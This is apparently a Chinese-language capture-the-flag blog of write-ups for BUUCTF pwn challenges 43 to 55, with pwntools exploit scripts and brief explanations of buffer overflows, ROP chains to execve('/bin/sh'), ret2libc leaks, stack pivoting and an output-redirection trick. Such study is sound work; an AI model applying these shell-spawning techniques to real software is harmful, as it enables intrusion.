<h2 id="43-ZJCTF-2019-EasyHeap"><a href="#43-ZJCTF-2019-EasyHeap" class="headerlink" title="43 [ZJCTF 2019]EasyHeap"></a>43 [ZJCTF 2019]EasyHeap</h2><p>施工中</p>
<h2 id="44-hitcontraining-uaf"><a href="#44-hitcontraining-uaf" class="headerlink" title="44 hitcontraining_uaf"></a>44 hitcontraining_uaf</h2><p>施工中</p>
<h2 id="45-pwnable-orw"><a href="#45-pwnable-orw" class="headerlink" title="45 pwnable_orw"></a>45 pwnable_orw</h2><p><em><strong>沙箱</strong></em></p>
<p>就是ban了一些危险的函数，但是以获得flag为目的的话也不需要非得getshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26440</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x804A060</span></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">shellcode+=shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,bss+<span class="number">100</span>,<span class="number">100</span>)</span><br><span class="line">shellcode+=shellcraft.write(<span class="number">1</span>,bss+<span class="number">100</span>,<span class="number">100</span>)</span><br><span class="line">payload = asm(shellcode)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;shellcode:&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#log.info(p.recv())</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="46-picoctf-2018-buffer-overflow-2"><a href="#46-picoctf-2018-buffer-overflow-2" class="headerlink" title="46 picoctf_2018_buffer overflow 2"></a>46 picoctf_2018_buffer overflow 2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28047</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x6c</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(<span class="number">0x080485CB</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0xDEADBEEF</span>)+p32(<span class="number">0xDEADC0DE</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="47-cmcc-simplerop"><a href="#47-cmcc-simplerop" class="headerlink" title="47 cmcc_simplerop"></a>47 cmcc_simplerop</h2><p><em><strong>rop</strong></em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29845</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">read_addr = elf.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806e850</span></span><br><span class="line">binsh = <span class="number">0x80EB584</span></span><br><span class="line">int_addr = <span class="number">0x80493e1</span>	<span class="comment"># int 0x80</span></span><br><span class="line">pop_eax = <span class="number">0x80bae06</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x20</span>+p32(read_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(<span class="number">0</span>)+p32(binsh)+p32(<span class="number">0x8</span>)</span><br><span class="line">payload+=p32(pop_eax)+p32(<span class="number">0xb</span>)+p32(pop_edx_ecx_ebx)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(binsh)+p32(int_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="分析分析"><a href="#分析分析" class="headerlink" title="分析分析"></a>分析分析</h3><p>这种纯手工构造ROP还是可以分析分析的</p>
<ul>
<li><p>首先是系统调用的知识，可以看<a target="_blank" rel="noopener" href="https://blog.csdn.net/xiaominthere/article/details/17287965">这里</a></p>
<ul>
<li>省流一下：<code>int 0x80</code>就是系统调用（syscall），然后根据<code>syscall(n)</code>中n的值执行不同函数，其中<code>0xb</code>可以执行<code>execve</code>函数</li>
</ul>
</li>
<li><p>接下来构造ROP</p>
<ul>
<li><p>先是溢出覆盖，这里ida显示的不对，动态调试可以发现实际的偏移是0x1c</p>
<p><img src="/./../polarD&N/images/image-20250204214033910.png" alt="image-20250204214033910"></p>
<blockquote>
<p>我们输入的相对位置是0x24,ebp的相对位置是0x40，实际偏移<code>0x40-0x24=0x1c</code></p>
</blockquote>
</li>
<li><p>因为程序中没有<code>/bin/sh</code>函数，所以我们需要调用一下<code>read</code>函数，以此输入一个<code>/bin/sh</code>进去（这里binsh的地址是bss段，因为没开PIE，所以地址所见即所得）</p>
</li>
<li><p>接下来第二行就是进行系统调用了，我们要申请的函数是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="number">0x80</span>(<span class="number">0xb</span>,’/bin/sh‘, null, null);</span><br><span class="line"><span class="comment">//对应寄存器eax, ebx,	 ecx,  edx</span></span><br></pre></td></tr></table></figure>

<p>这四个寄存器地址也确实可以搜到，所以根据寄存器依次输入需要的数就好</p>
</li>
</ul>
</li>
</ul>
<h2 id="48-Black-Watch-入群题-PWN"><a href="#48-Black-Watch-入群题-PWN" class="headerlink" title="48 [Black Watch 入群题]PWN"></a>48 [Black Watch 入群题]PWN</h2><p><em><strong>栈迁移+ret2libc</strong></em></p>
<p>因为没有RWX段，所以不可以写入shellcode然后栈迁移执行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>, <span class="number">25707</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x8048513</span></span><br><span class="line">lea_ret_addr = <span class="number">0x8048511</span></span><br><span class="line">plt_write = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">got_write = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">bss_s_addr = <span class="number">0x804A300</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span> + p32(plt_write) + p32(main_addr) + p32(<span class="number">1</span>) + p32(got_write) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;name?&quot;</span>, payload1)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p32(bss_s_addr) + p32(lea_ret_addr)</span><br><span class="line">p.sendafter(<span class="string">&quot;say?&quot;</span>, payload2)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">offset = write_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">binsh = offset + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">system = offset + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">b&#x27;aaaa&#x27;</span> + p32(system) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(binsh)</span><br><span class="line">p.sendafter(<span class="string">&quot;name?&quot;</span>, payload3)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;say?&quot;</span>, payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="49-wustctf2020-getshell-2"><a href="#49-wustctf2020-getshell-2" class="headerlink" title="49 wustctf2020_getshell_2"></a>49 wustctf2020_getshell_2</h2><p><em><strong>基础ROP</strong></em></p>
<p>system(&#x2F;sh)也可以getshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28502</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = <span class="number">0x08048670</span></span><br><span class="line">call_sys = <span class="number">0x8048529</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(call_sys)+p32(sh)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="50-mrctf2020-easyoverflow"><a href="#50-mrctf2020-easyoverflow" class="headerlink" title="50 mrctf2020_easyoverflow"></a>50 mrctf2020_easyoverflow</h2><p><em><strong>栈数据覆盖</strong></em></p>
<p>发现当<code>check(v5)</code>等于<code>n0t_r3@11y_f1@g</code>时会getshell，然后<code>v4</code>的读入不限制长度，可以覆盖掉v5的值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29336</span>)</span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x30</span>+<span class="string">b&#x27;n0t_r3@11y_f1@g&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="51-bbys-tu-2016"><a href="#51-bbys-tu-2016" class="headerlink" title="51 bbys_tu_2016"></a>51 bbys_tu_2016</h2><p><em><strong>ret2text</strong></em></p>
<p>ida里面的偏移有问题，需要动态调试看看</p>
<p><img src="/./images/image-20250206135324577.png" alt="image-20250206135324577"></p>
<p>这里<code>-14</code>，说明偏移为14</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25770</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x804856D</span></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span>+p32(flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="52-xdctf2015-pwn200"><a href="#52-xdctf2015-pwn200" class="headerlink" title="52 xdctf2015_pwn200"></a>52 xdctf2015_pwn200</h2><p><em><strong>ret2libc</strong></em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25844</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_got=e.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_plt=e.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"></span><br><span class="line">main_add=e.sym[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)+p32(write_plt)+p32(main_add)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">write=u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;write:&quot;</span>,<span class="built_in">hex</span>(write))</span><br><span class="line"></span><br><span class="line">libc_base=write-<span class="number">0xd43c0</span></span><br><span class="line"></span><br><span class="line">system = <span class="number">0x3a940</span> + libc_base</span><br><span class="line">bin_sh = <span class="number">0x15902b</span> + libc_base</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&quot;a&quot;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)+p32(system)+p32(main_add)+p32(bin_sh)</span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="53-wustctf2020-closed"><a href="#53-wustctf2020-closed" class="headerlink" title="53 wustctf2020_closed"></a>53 wustctf2020_closed</h2><p><em><strong>重定向</strong></em></p>
<p>ida看一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">vulnerable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;HaHaHa!\nWhat else can you do???&quot;</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  close(<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">return</span> shell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关闭了标准输出（1）和错误输出（2），就算是getshell了也不会得到回显。所以可以利用<code>exec 1&gt;&amp;0</code>将标准输出重定向到标准输入</p>
<h3 id="标准文件描述符"><a href="#标准文件描述符" class="headerlink" title="标准文件描述符"></a>标准文件描述符</h3><ul>
<li><strong>标准输入（stdin）</strong>：使用文件描述符0（FD 0）表示，默认情况下终端键盘输入与其关联。</li>
<li><strong>标准输出（stdout）</strong>：使用文件描述符1（FD 1）表示，默认情况下终端屏幕显示与其关联。</li>
<li><strong>标准错误（stderr）</strong>：使用文件描述符2（FD 2）表示，默认情况下终端屏幕显示与其关联。</li>
</ul>
<h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p><code>exec 1&gt;&amp;0</code>是Shell命令行中的重定向语法，用于将标准输出重定向到标准输入，<strong>因此后续的输出会被作为输入来处理</strong></p>
<p>所以只需要nc之后输入<code>exec 1&gt;&amp;0</code>就可以了</p>
<h2 id="54-ciscn-2019-s-4"><a href="#54-ciscn-2019-s-4" class="headerlink" title="54 ciscn_2019_s_4"></a>54 ciscn_2019_s_4</h2><p><em><strong>栈迁移</strong></em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26010</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x08048562</span></span><br><span class="line">sys = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x24</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;name?\n&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u32(p.recv(<span class="number">4</span>))	<span class="comment">#	ebp的地址泄露出来</span></span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">buf = leak_addr-<span class="number">0x38</span>	<span class="comment"># 回到栈顶</span></span><br><span class="line"></span><br><span class="line">payload2 = p32(sys)+p32(<span class="number">0</span>)+p32(buf+<span class="number">0xc</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>	<span class="comment"># </span></span><br><span class="line">payload2 = payload2.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>)+p32(buf-<span class="number">4</span>)+p32(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="动态调试分析"><a href="#动态调试分析" class="headerlink" title="动态调试分析"></a>动态调试分析</h3><ul>
<li><p>先看下新栈的地址为什么是<code>ebp-0x38</code></p>
<ul>
<li><img src="/./images/image-20250210000514934.png" alt="image-20250210000514934"></li>
<li>这里是寄存器的地址，可以看到我们的字符串输入到了<code>760</code>处、而<code>ebp</code>指向了<code>798</code>处，相差<code>0x3</code>8字节，所以将栈迁移到这里，方便执行我们的输入</li>
</ul>
</li>
<li><p>&#x3D;&#x3D;payload2 &#x3D; (p32(sys)+p32(0)+p32(buf+0xc)+b’&#x2F;bin&#x2F;sh\x00’).ljust(0x28,b’a’)+p32(buf-4)+p32(leave_ret)&#x3D;&#x3D;</p>
<ul>
<li><p><code>p32(buf-4)</code>:将ebp覆盖为了<code>buf-4</code>,因为每执行一条指令之后eip会自动+4，这里将eip退回去，防止跳过指令</p>
</li>
<li><p><code>p32(leave_ret)</code>：将返回地址覆盖为leave</p>
<blockquote>
<p>此时的栈结构</p>
<table>
<thead>
<tr>
<th>buf</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>sys_addr</td>
<td>system函数地址</td>
</tr>
<tr>
<td>0</td>
<td>返回地址（占位）</td>
</tr>
<tr>
<td>buf+12</td>
<td>&#x2F;bin&#x2F;sh的参数地址</td>
</tr>
<tr>
<td>&#x2F;bin&#x2F;sh</td>
<td></td>
</tr>
<tr>
<td>填充的剩余空间</td>
<td></td>
</tr>
<tr>
<td>buf-4</td>
<td>栈迁移后的ebp</td>
</tr>
<tr>
<td>leave</td>
<td>执行leave_ret</td>
</tr>
</tbody></table>
</blockquote>
</li>
</ul>
</li>
</ul>
<h2 id="55-ZJCTF-2019-Login"><a href="#55-ZJCTF-2019-Login" class="headerlink" title="55 [ZJCTF 2019]Login"></a>55 [ZJCTF 2019]Login</h2><p>栈追踪？或许叭</p>
<p>函数是用c++写的，看起来有点令人头大</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">❯ checksec pwn</span><br><span class="line">[*] &#x27;/home/pwn/pwn/buuctf/55/pwn&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<p>ida查看</p>
<img src="./images/image-20250216001902396.png" alt="image-20250216001902396" style="zoom:80%;" />

<p>在第14和16行发现要输入的账号和密码，不过肯定没有这么简单，执行看看</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">❯ ./pwn</span><br><span class="line"> _____   _  ____ _____ _____   _                _</span><br><span class="line">|__  /  | |/ ___|_   _|  ___| | |    ___   __ _(_)_ __</span><br><span class="line">  / /_  | | |     | | | |_    | |   / _ \ / _` | | &#x27;_ \</span><br><span class="line"> / /| |_| | |___  | | |  _|   | |__| (_) | (_| | | | | |</span><br><span class="line">/____\___/ \____| |_| |_|     |_____\___/ \__, |_|_| |_|</span><br><span class="line">                                          |___/</span><br><span class="line">Please enter username: admin</span><br><span class="line">Please enter password: 2jctf_pa5sw0rd</span><br><span class="line">Password accepted: Password accepted:</span><br><span class="line"></span><br><span class="line">[1]    4014 segmentation fault  ./pwn</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;寄&#x3D;&#x3D;</p>
<p>看别人的汇编发现在<code>password_checker</code>函数中有一个隐蔽的错误</p>
<img src="./images/image-20250216002126070.png" alt="image-20250216002126070" style="zoom: 80%;" />

